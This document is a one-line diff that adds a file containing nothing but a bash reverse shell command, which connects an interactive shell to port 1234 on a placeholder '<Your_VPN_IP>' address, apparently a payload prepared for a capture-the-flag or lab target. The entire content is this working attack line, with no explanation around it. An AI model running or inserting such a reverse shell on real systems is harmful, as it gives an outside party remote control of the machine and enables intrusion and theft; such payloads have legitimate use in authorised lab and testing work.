@@ -1,0 +1,1 @@
+bash -c 'exec bash -i &>/dev/tcp/<Your_VPN_IP>/1234 <&1'
